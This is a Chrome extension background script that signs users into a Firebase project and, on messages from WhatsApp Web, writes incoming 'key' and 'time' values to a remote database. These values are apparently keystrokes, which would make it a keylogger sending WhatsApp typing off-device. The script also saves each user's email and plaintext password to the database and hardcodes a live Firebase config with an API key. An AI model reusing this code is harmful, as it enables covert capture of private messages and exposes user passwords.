// Upload Data to firebase database

const WHATSAPP_WEB = "https://web.whatsapp.com/"
const SIGN_IN_ACTION = "SIGNIN"
const SIGN_UP_ACTION = "SIGNUP"
const SIGN_OUT_ACTION = "SIGNOUT"

const config = {
    apiKey: "AIzaSyABnZ9KDeJiJxqswHy7rJqVhP5Qu5DOxRo",
    authDomain: "anona-dd0ad.firebaseapp.com",
    databaseURL: "https://anona-dd0ad.firebaseio.com",
    projectId: "anona-dd0ad",
    storageBucket: "anona-dd0ad.appspot.com",
    messagingSenderId: "126637111077"
  };

const FIREBASEANONA = firebase.initializeApp(config);
var isSignedIn = false;
var databaseKey = "a";

function writeClientData(key, time, databaseKey) {
    FIREBASEANONA.database().ref("users/" + databaseKey + "/keys").update({
        [time]: key
    });
}

function onSignError(error) {
    alert(error.message);
}

function updateDatabase(request){
    var email = request.email, password = request.password,
        key = email.substr(0, email.indexOf('@'));
    // Set database Users/[username] without @-- with password.
    FIREBASEANONA.database().ref('users/' + key).update({
        email: email,
        password: password
    });
    
    return key;
}

function onMessage(request, sender){
    if(!isSignedIn){
        if(request.action == SIGN_IN_ACTION){
            firebase.auth().signInWithEmailAndPassword(request.email, request.password).then(function () {
                isSignedIn = true;
                databaseKey = updateDatabase(request);
                alert("successfully signed in!")
                chrome.browserAction.setPopup({
                    popup: "signedIn.html"
                });
            }).catch(onSignError);
		}
		if(request.action == SIGN_UP_ACTION){
            firebase.auth().createUserWithEmailAndPassword(request.email, request.password).then(function (user) {
                isSignedIn = true;
                databaseKey = updateDatabase(request);
                alert("successfully signed up!")
                chrome.browserAction.setPopup({
                    popup: "signedIn.html"
                });
            }).catch(onSignError)
		}
    }
	else {
        if(sender.url == WHATSAPP_WEB && isSignedIn){
            console.log(request.key + "- " + request.time);
            writeClientData(request.key, request.time, databaseKey);
        }
        if (request.action == SIGN_OUT_ACTION){
            firebase.auth().signOut().then(function() {
                alert("Signed Out Successfully!");
                chrome.browserAction.setPopup({
                    popup: "popUpMain.html"
                });
            });
        }
    }
}

chrome.runtime.onMessage.addListener(onMessage);